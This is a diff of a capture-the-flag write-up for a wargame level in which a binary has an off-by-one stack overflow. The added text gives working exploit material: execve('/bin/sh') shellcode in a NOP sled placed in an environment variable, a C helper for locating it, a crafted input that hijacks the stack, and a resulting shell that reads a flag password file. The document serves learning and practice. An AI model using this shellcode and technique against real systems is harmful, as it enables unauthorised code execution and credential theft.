@@ -37,111 +37,95 @@ OFFSET           TYPE              VALUE
 
 No sign of an unprotected function like gets() or read() with a smaller buffer.
 
-There is this condition in the store_record() function:
-
-```shell
+The source code shows that an 'off-by-one' exploit is possible:
+```C
 while (in_len <= BUF_SIZE) {
-    in_ch = read(0, &buf[in_len], 1); # 0x401448
+   in_ch = read(0, &buf[in_len], 1);
+   if (in_ch <= 0)
+      break;
+   in_len++;
+}
 ```
+the `<=` operator makes the loop read 65 characters where the buffer size is set at `64`
 
-It reads one byte at a time until the buffer is full, but it does that for len <= BUF_SIZE (64 bytes), so we can do 65 iterations and overflow.
+if we use as input a string with  65 characters, the last one will end up in the last byte of RBP register because
+of the overflow and that the buffer is located just above RBP in the stack
+example using 64 * A + 1 * B:
 
 ```shell
-[FLATLINE] Ready: AaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaA # 65 bytes
-[FLATLINE] Record 0 stored. Checksum: 57acb1fd
-[FLATLINE] Record 0: AaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAa (checksum: 5a700f25)
-  [FLATLINE] ���� session closed.
-Segmentation fault (core dumped)
+0x7fffffffdfa0:	0x4141414141414141	0x4141414141414141
+0x7fffffffdfb0:	0x4141414141414141	0x4141414141414141
+0x7fffffffdfc0:	0x4141414141414141	0x4141414141414141
+0x7fffffffdfd0:	0x4141414141414141	0x4141414141414141
+0x7fffffffdfe0:	0x00007fffffffe042
 ```
+we can see that the buffer is filled with `A (41)` and the RBP register `at 0x7fffffffdfe0` ends with `B (42)`
 
+So if we manage to make rbp point to somewhere in the buffer, we can make RSP to later point to RBP + 8:
+also in the buffer.
 
-launch env -i gdb + shellcode as an env var
-Then `unset environment LINES` and `unset environment COLUMNS`. 
+The main issue here is that the call to `dump_records();` after `store_records();` corrupts the buffer and replaces
+some of the data:
+```shell
+0x7fffffffdfa0:	0x4141414141414141	0x4141414141414141
+0x7fffffffdfb0:	0x4141414141414141	0x4141414141414141
+0x7fffffffdfc0:	0x00007fffffffdfe0	0x000000000040152c
+0x7fffffffdfd0:	0x4141414141414141	0x0000000141414141
+0x7fffffffdfe0:	0x00007fffffffe042	0x000000000040157a
+0x7fffffffdff0:	0x0000006569786964
+```
+The buffer, that was originally filled with `41` characters now contains trash from the `dump_records()` function
 
+However, the first 4 bytes are untouched. This does not leave enough space to store a shellcode, so we decided to use an environnement variable to store the shellcode, and to make the RSP register point to it.
+(We've used a lot of NOP operators before the shellcode to simplify the "aim")
 
 ```shell
-(gdb) disas store_record
-Dump of assembler code for function store_record:
-   0x00000000004013d2 <+0>:	endbr64
-   0x00000000004013d6 <+4>:	push   %rbp
-   0x00000000004013d7 <+5>:	mov    %rsp,%rbp
-...
-   0x0000000000401434 <+98>:	lea    -0x40(%rbp),%rdx
-   0x0000000000401438 <+102>:	add    %rdx,%rax
-   0x000000000040143b <+105>:	mov    $0x1,%edx
-   0x0000000000401440 <+110>:	mov    %rax,%rsi
-   0x0000000000401443 <+113>:	mov    $0x0,%edi
-   0x0000000000401448 <+118>:	call   0x4010c0 <read@plt>
-...
-   0x000000000040149c <+202>:	call   0x4012c7 <commit_record>
-   0x00000000004014a1 <+207>:	leave
-   0x00000000004014a2 <+208>:	ret
+python3 -c 'import sys; sys.stdout.buffer.write(b"\x90" * 500 + b"\x31\xf6\x56\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x31\xc0\x66\xb8\x2d\x70\x50\x56\x48\x8d\x44\x24\x08\x50\x57\x48\x89\xe6\x31\xd2\x31\xc0\xb0\x3b\x0f\x05")' > sc
+
+export S=$(cat sc)
 ```
+
+We struggled a lot on that one, because of the differences between addresses in gdb and the real ones on binary execution. 
+
+```C
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(int argc, char **argv) {
+    char *ptr;
+
+    ptr = getenv(argv[1]);
+    if (ptr == NULL) {
+        printf("%s not found in environment\n", argv[1]);
+        exit(0);
+    }
+    printf("%s is at %p\n", argv[1], ptr);
+    exit(0);
+}
+```
+We can use this small script to figure out the address of the env var outside of gdb:
+```shell
+level02@rainfall:~$ ./dixit S
+S is at 0x7fffffffe46a
+```
+
+Let's try to use the address given by the program + a little offset to try to point inside the NOP of the shellcode:
+0x7fffffffe46a => 0x7fffffffe47a
 
 ```shell
-(gdb) b store_record
-Breakpoint 1 at 0x4013da
-(gdb) p/x $rbp
-$2 = 0x7fffffffecc0
-(gdb) x/gx $rbp # Value of the base pointer of main
-0x7fffffffecc0:	0x00007fffffffece0
-(gdb) x/gx $rbp+8 # Value of the return address of main
-0x7fffffffecc8:	0x0000000000401575
-(gdb) p/x $rbp-0x40 # Buffer address
-$3 = 0x7fffffffec80
+python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 8 + b"\x7a\xe4\xff\xff\xff\x7f\x00\x00" + b"A" * 48 + b"\x00")' > input
+
+(cat input; cat) | ./dixie
+  [FLATLINE] The Dixie Flatline lives again.
+  [FLATLINE] ROM construct v3.0 — memory interface ready.
+  [FLATLINE] Ready: [FLATLINE] Record 0 stored. Checksum: 5a55e665
+  [FLATLINE] Record 0: AAAAAAAA_���� (checksum: 5a55e665)
+  [FLATLINE] AAAAAAAAAAAAAAAA ���� session closed.
+whoami
+flag02
+cat /home/flag02/.pass
+qeplvibynup98phqb312dkvhtpdkklac
+
+
 ```
-
-```shell
-(gdb) b*0x4014a1               
-Breakpoint 1 at 0x4014a1 # leave instruction of store_record
-(gdb) r < /tmp/65
-Starting program: /home/level02/dixie < /tmp/65
-# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB
-Breakpoint 1, 0x00000000004014a1 in store_record ()
-(gdb) x/11gx $rbp-0x40
-0x7fffffffec80:	0x4141414141414141	0x4141414141414141
-0x7fffffffec90:	0x4141414141414141	0x4141414141414141
-0x7fffffffeca0:	0x4141414141414141	0x4141414141414141
-0x7fffffffecb0:	0x4141414141414141	0x4141414141414141 # the 64 A + 42 on following line is the 65th byte
-0x7fffffffecc0:	0x00007fffffffec42	0x0000000000401575 <- # return address of main, as we saw before
-0x7fffffffecd0:	0x0000006569786964
-```
-
-```shell
-(gdb) x/2i $pc # shows next 2 instructions
-=> 0x4014a1 <store_record+207>:	leave
-   0x4014a2 <store_record+208>:	ret
-(gdb) ni # execute next instruction
-0x00000000004014a2 in store_record ()
-(gdb) p/x $rbp
-$2 = 0x7fffffffec42 # the 65th byte we wrote overwrote the base pointer of main
-(gdb) ni # Next instruction return to main
-0x0000000000401575 in main ()
-```
-
-```shell
-(gdb) disas main
-Dump of assembler code for function main:
-   0x0000000000401543 <+0>:	endbr64
-   0x0000000000401547 <+4>:	push   %rbp
-   ...
-   0x0000000000401595 <+82>:	mov    $0x0,%eax
-   0x000000000040159a <+87>:	leave
-   0x000000000040159b <+88>:	ret
-   End of assembler dump.
-
-(gdb) b *0x40159a # Breakpoint at the leave instruction of main
-Breakpoint 2 at 0x40159a
-(gdb) c
-Continuing.
-[FLATLINE] Record 0: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA (checksum: 5a655a65)
-  [FLATLINE]  session closed.
-
-Breakpoint 2, 0x000000000040159a in main ()
-(gdb) p/x $rbp
-$3 = 0x7fffffffec42 # Still overwritten rbp
-(gdb) x/gx $rbp+8 # Value of the return address of main
-0x7fffffffec4a:	0x0040000000000040
-(gdb) p/x ($rbp+8) - 0x7fffffffec80 # b
-$5 = 0xffffffffffffffca # = -54
-```
+Success !! we've got the flag
